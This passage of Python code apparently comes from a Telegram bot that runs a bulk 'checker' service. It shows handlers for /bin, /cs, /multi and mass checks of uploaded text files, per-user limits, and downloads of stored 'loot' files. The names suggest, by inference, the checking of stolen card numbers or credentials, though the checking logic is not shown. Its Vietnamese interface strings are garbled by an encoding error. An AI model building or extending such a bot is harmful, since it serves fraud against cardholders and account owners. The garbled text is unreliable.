                keyboard.append([InlineKeyboardButton(f"T·∫£i {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("¬´ Quay l·∫°i L·ªãch S·ª≠", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch·ªçn file ƒë·ªÉ t·∫£i t·ª´ session `{session_ts}`:", reply_markup=reply_markup)

        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc:
                    await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"ƒê√£ g·ª≠i file {filename}")
            else:
                await query.answer("‚ùå L·ªói: Kh√¥ng t√¨m th·∫•y file.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot ƒëang ch·∫°y v·ªõi Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
